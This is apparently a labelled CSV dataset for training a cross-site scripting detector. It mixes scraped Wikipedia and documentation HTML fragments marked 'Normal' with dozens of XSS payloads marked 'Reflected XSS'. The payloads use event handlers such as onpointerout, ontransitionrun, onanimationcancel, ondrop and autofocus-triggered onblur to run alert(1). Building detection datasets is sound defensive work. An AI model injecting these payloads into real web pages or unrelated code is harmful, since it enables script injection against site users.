Sentence,Final_Label
"<style>:target {transform: rotate(180deg);}</style><details id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></details>",Reflected XSS
"	 </span>. <i>Journal of Informetrics </i>. <b>5 </b> (4): 629–649. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.joi.2011.06.002"">10.1016/j.joi.2011.06.002 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Informetrics&amp;rft.atitle=Comparing+the+expert+survey+and+citation+impact+journal+ranking+methods%3A+Example+from+the+field+of+Artificial+Intelligence&amp;rft.volume=5&amp;rft.issue=4&amp;rft.pages=629-649&amp;rft.date=2011&amp;rft_id=info%3Adoi%2F10.1016%2Fj.joi.2011.06.002&amp;rft.aulast=Serenko&amp;rft.aufirst=Alexander&amp;rft.au=Michael+Dohan&amp;rft_id=http%3A%2F%2Fwww.aserenko.com%2Fpapers%2FJOI_AI_Journal_Ranking_Serenko.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<select onpointerout=alert(1)>XSS</select>,Reflected XSS
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,Reflected XSS
<nav onpointerleave=alert(1)>XSS</nav>,Reflected XSS
"<li><a href=""/wiki/Demarcation_problem"" title=""Demarcation problem"">Demarcation problem </a> </li>",Normal
"<dl onmouseout=""alert(1)"">test</dl>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",Reflected XSS
"<meta onmouseenter=""alert(1)"">test</meta>",Reflected XSS
"<meta onmouseout=""alert(1)"">test</meta>",Reflected XSS
<h1 onpointerdown=alert(1)>XSS</h1>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>",Reflected XSS
"<figcaption onmouseup=""alert(1)"">test</figcaption>",Reflected XSS
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,Reflected XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Metaheuristic"" title=""Metaheuristic"">Metaheuristic methods </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<li id=""cite_note-354""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-354"">^ </a> </b> ",Normal
"<li><a href=""/wiki/Feminist_method"" title=""Feminist method"">Feminist method </a> </li>",Normal
        <dt>On Read the Docs</dt>,Normal
"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Autoweek&amp;rft.atitle=Don%27t+worry%3A+Autonomous+cars+aren%27t+coming+tomorrow+%28or+next+year%29&amp;rft.date=2016&amp;rft_id=http%3A%2F%2Fautoweek.com%2Farticle%2Ftechnology%2Ffully-autonomous-vehicles-are-more-decade-down-road&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<figure onmousedown=""alert(1)"">test</figure>",Reflected XSS
"	 </span> [<a rel=""nofollow"" class=""external text"" href=""//arxiv.org/archive/stat.ML"">stat.ML </a>]. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=preprint&amp;rft.jtitle=arXiv&amp;rft.atitle=Explaining+and+Harnessing+Adversarial+Examples&amp;rft.date=2014&amp;rft_id=info%3Aarxiv%2F1412.6572&amp;rft.aulast=Goodfellow&amp;rft.aufirst=Ian+J.&amp;rft.au=Shlens%2C+Jonathon&amp;rft.au=Szegedy%2C+Christian&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<style>:target {color: red;}</style><slot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></slot>",Reflected XSS
"<html onkeydown=""alert(1)"" contenteditable>test</html>",Reflected XSS
"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",Reflected XSS
"<li><a href=""/wiki/Network_performance"" title=""Network performance"">Network performance evaluation </a> </li>",Normal
<rb onpointerup=alert(1)>XSS</rb>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>",Reflected XSS
"<section onclick=""alert(1)"">test</section>",Reflected XSS
"<li><a href=""/wiki/Allenna_Leonard"" title=""Allenna Leonard"">Allenna Leonard </a> </li>",Normal
"<p>Early researchers developed algorithms that imitated step-by-step reasoning that humans use when they solve puzzles or make logical deductions.<sup id=""cite_ref-Reasoning_88-0"" class=""reference""><a href=""#cite_note-Reasoning-88"">&#91;85&#93; </a> </sup> By the late 1980s and 1990s, AI research had developed methods for dealing with <a href=""/wiki/Uncertainty"" title=""Uncertainty"">uncertain </a> or incomplete information, employing concepts from <a href=""/wiki/Probability"" title=""Probability"">probability </a> and <a href=""/wiki/Economics"" title=""Economics"">economics </a>.<sup id=""cite_ref-Uncertain_reasoning_89-0"" class=""reference""><a href=""#cite_note-Uncertain_reasoning-89"">&#91;86&#93; </a> </sup>",Normal
"<listing onbeforepaste=""alert(1)"" contenteditable>test</listing>",Reflected XSS
"<li><cite id=""CITEREFHawkinsBlakeslee2005"" class=""citation book""><a href=""/wiki/Jeff_Hawkins"" title=""Jeff Hawkins"">Hawkins, Jeff </a>; Blakeslee, Sandra (2005). <a href=""/wiki/On_Intelligence"" title=""On Intelligence""><i>On Intelligence </i> </a>. New York, NY: Owl Books. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-8050-7853-4"" title=""Special:BookSources/978-0-8050-7853-4""><bdi>978-0-8050-7853-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=On+Intelligence&amp;rft.place=New+York%2C+NY&amp;rft.pub=Owl+Books&amp;rft.date=2005&amp;rft.isbn=978-0-8050-7853-4&amp;rft.aulast=Hawkins&amp;rft.aufirst=Jeff&amp;rft.au=Blakeslee%2C+Sandra&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<bgsound onpointermove=alert(1)>XSS</bgsound>,Reflected XSS
"<font onbeforepaste=""alert(1)"" contenteditable>test</font>",Reflected XSS
"<li><a href=""/wiki/Knowledge_extraction"" title=""Knowledge extraction"">Knowledge extraction </a> </li>",Normal
<thead id=x tabindex=1 onactivate=alert(1)></thead>,Reflected XSS
"<output draggable=""true"" ondragstart=""alert(1)"">test</output>",Reflected XSS
<button onpointerleave=alert(1)>XSS</button>,Reflected XSS
<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>,Reflected XSS
"<content onkeyup=""alert(1)"" contenteditable>test</content>",Reflected XSS
"<blockquote onmousedown=""alert(1)"">test</blockquote>",Reflected XSS
"<li><a href=""/wiki/History_of_robots"" title=""History of robots"">History </a> </li>",Normal
"<base onmouseover=""alert(1)"">test</base>",Reflected XSS
			</div>,Normal
<title onpointermove=alert(1)>XSS</title>,Reflected XSS
"	 </span>. <i>Science </i>. <b>291 </b> (5504): 599–600. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.291.5504.599"">10.1126/science.291.5504.599 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/11229402"">11229402 </a> &#8211; via msu.edu. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Autonomous+mental+development+by+robots+and+animals&amp;rft.volume=291&amp;rft.issue=5504&amp;rft.pages=599-600&amp;rft.date=2001&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.291.5504.599&amp;rft_id=info%3Apmid%2F11229402&amp;rft.aulast=Weng&amp;rft.aufirst=J.&amp;rft.au=McClelland&amp;rft.au=Pentland%2C+A.&amp;rft.au=Sporns%2C+O.&amp;rft.au=Stockman%2C+I.&amp;rft.au=Sur%2C+M.&amp;rft.au=Thelen%2C+E.&amp;rft_id=http%3A%2F%2Fwww.cse.msu.edu%2Fdl%2FSciencePaper.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<animatetransform onpointerover=alert(1)>XSS</animatetransform>,Reflected XSS
"<output onmousedown=""alert(1)"">test</output>",Reflected XSS
"<li><a href=""/wiki/Existential_risk_from_artificial_general_intelligence"" title=""Existential risk from artificial general intelligence"">Existential risk from artificial general intelligence </a> </li>",Normal
<dfn onpointerleave=alert(1)>XSS</dfn>,Reflected XSS
"<output onmousemove=""alert(1)"">test</output>",Reflected XSS
<datalist id=x tabindex=1 onactivate=alert(1)></datalist>,Reflected XSS
<audio id=x tabindex=1 onactivate=alert(1)></audio>,Reflected XSS
<em onpointermove=alert(1)>XSS</em>,Reflected XSS
"<wbr draggable=""true"" ondrag=""alert(1)"">test</wbr>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>",Reflected XSS
"<tbody oncopy=""alert(1)"" contenteditable>test</tbody>",Reflected XSS
"<li><a href=""/wiki/Behavior_selection_algorithm"" title=""Behavior selection algorithm"">Behavior selection algorithm </a> </li>",Normal
"<slot draggable=""true"" ondragleave=""alert(1)"">test</slot>",Reflected XSS
<dialog onblur=alert(1) tabindex=1 id=x></dialog><input autofocus>,Reflected XSS
<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,Reflected XSS
<details ontoggle=alert(1) open>test</details>,Reflected XSS
<li id=x tabindex=1 onfocusin=alert(1)></li>,Reflected XSS
"<input draggable=""true"" ondragleave=""alert(1)"">test</input>",Reflected XSS
<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>,Reflected XSS
"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",Reflected XSS
"<textarea onmousedown=""alert(1)"">test</textarea>",Reflected XSS
"	 </span> <span class=""toctext"">Technological singularity ",Normal
<font onpointermove=alert(1)>XSS</font>,Reflected XSS
"<li><a href=""/wiki/Emergence"" title=""Emergence"">Emergence </a> </li>",Normal
"<textarea onmouseout=""alert(1)"">test</textarea>",Reflected XSS
"				<div class=""magnify""><a href=""/wiki/File:Kismet_robot_at_MIT_Museum.jpg"" class=""internal"" title=""Enlarge""> </a> </div><a href=""/wiki/Kismet_(robot)"" title=""Kismet (robot)"">Kismet </a>, a robot with rudimentary social skills<sup id=""cite_ref-FOOTNOTE&#39;&#39;Kismet&#39;&#39;_136-0"" class=""reference""><a href=""#cite_note-FOOTNOTE&#39;&#39;Kismet&#39;&#39;-136"">&#91;133&#93; </a> </sup> </div> </div> ",Normal
"<fieldset oncopy=""alert(1)"" contenteditable>test</fieldset>",Reflected XSS
<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,Reflected XSS
"<canvas onkeydown=""alert(1)"" contenteditable>test</canvas>",Reflected XSS
<thead id=x tabindex=1 onfocus=alert(1)></thead>,Reflected XSS
"<thead onmousemove=""alert(1)"">test</thead>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio (May 2018). ""The knowledge level in cognitive architectures: Current limitations and possible developments"". <i>Cognitive Systems Research </i>. <b>48 </b>: 39–55. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.05.001"">10.1016/j.cogsys.2017.05.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665207"">2318/1665207 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+knowledge+level+in+cognitive+architectures%3A+Current+limitations+and+possible+developments&amp;rft.volume=48&amp;rft.pages=39-55&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665207&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.05.001&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<article onmousedown=""alert(1)"">test</article>",Reflected XSS
"<dialog onpaste=""alert(1)"" contenteditable>test</dialog>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tbody>",Reflected XSS
"<html onbeforecut=""alert(1)"" contenteditable>test</html>",Reflected XSS
"<html draggable=""true"" ondragenter=""alert(1)"">test</html>",Reflected XSS
"<command onmouseleave=""alert(1)"">test</command>",Reflected XSS
"<noframes onmouseenter=""alert(1)"">test</noframes>",Reflected XSS
"<header onmouseleave=""alert(1)"">test</header>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bgsound>",Reflected XSS
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;113–132 </li>",Normal
<param onpointermove=alert(1)>XSS</param>,Reflected XSS
"<keygen draggable=""true"" ondragleave=""alert(1)"">test</keygen>",Reflected XSS
"<a href=""/wiki/Philosophy_of_artificial_intelligence"" title=""Philosophy of artificial intelligence"">Philosophy </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",Normal
<rp onpointermove=alert(1)>XSS</rp>,Reflected XSS
"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",Reflected XSS
"<keygen onclick=""alert(1)"">test</keygen>",Reflected XSS
"<font draggable=""true"" ondragleave=""alert(1)"">test</font>",Reflected XSS
"<li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a>, p.&#160;3 </li> </ul>",Normal
"<thead onbeforecut=""alert(1)"" contenteditable>test</thead>",Reflected XSS
"<li><a href=""/wiki/Philosophy_of_social_science"" title=""Philosophy of social science"">Social science </a> </li>",Normal
"<footer onbeforecopy=""alert(1)"" contenteditable>test</footer>",Reflected XSS
<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,Reflected XSS
"analytics.load(""8UDQfnf3cyFSTsM4YANnW5sXmgZVILbA"");",Normal
"<style>:target {color: red;}</style><keygen id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></keygen>",Reflected XSS
"<title onkeypress=""alert(1)"" contenteditable>test</title>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.businessinsider.com/mark-zuckerberg-shares-thoughts-elon-musks-ai-2018-5"">""Mark Zuckerberg responds to Elon Musk's paranoia about AI: 'AI is going to... help keep our communities safe.<span class=""cs1-kern-right"">' ",Normal
"<li class=""toctree-l1""><a class=""reference internal"" href=""contributing.html"">Contributing to Scrapy</a></li>",Normal
"<base onkeydown=""alert(1)"" contenteditable>test</base>",Reflected XSS
"<hgroup draggable=""true"" ondragenter=""alert(1)"">test</hgroup>",Reflected XSS
"<aside onkeydown=""alert(1)"" contenteditable>test</aside>",Reflected XSS
"<i draggable=""true"" ondragend=""alert(1)"">test</i>",Reflected XSS
"<title onmouseup=""alert(1)"">test</title>",Reflected XSS
<textarea onblur=alert(1) id=x></textarea><input autofocus>,Reflected XSS
"<h1 oncopy=""alert(1)"" contenteditable>test</h1>",Reflected XSS
<section id=x tabindex=1 onfocusin=alert(1)></section>,Reflected XSS
<canvas onpointermove=alert(1)>XSS</canvas>,Reflected XSS
<dd onfocusout=alert(1) tabindex=1 id=x></dd><input autofocus>,Reflected XSS
<optgroup onpointermove=alert(1)>XSS</optgroup>,Reflected XSS
<dt onpointerdown=alert(1)>XSS</dt>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>",Reflected XSS
"<shadow onmouseenter=""alert(1)"">test</shadow>",Reflected XSS
"<dialog oncopy=""alert(1)"" contenteditable>test</dialog>",Reflected XSS
"<picture onclick=""alert(1)"">test</picture>",Reflected XSS
"<li class=""toctree-l1""><a class=""reference internal"" href=""faq.html"">Frequently Asked Questions</a></li>",Normal
<figure onpointerout=alert(1)>XSS</figure>,Reflected XSS
"<td ondblclick=""alert(1)"">test</td>",Reflected XSS
"<video draggable=""true"" ondragend=""alert(1)"">test</video>",Reflected XSS
"<style>@keyframes x{}</style><b style=""animation-name:x"" onanimationstart=""alert(1)""></b>",Reflected XSS
"<q onkeyup=""alert(1)"" contenteditable>test</q>",Reflected XSS
<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>,Reflected XSS
"<li class=""toclevel-1 tocsection-4""><a href=""#Challenges""><span class=""tocnumber"">4 ",Normal
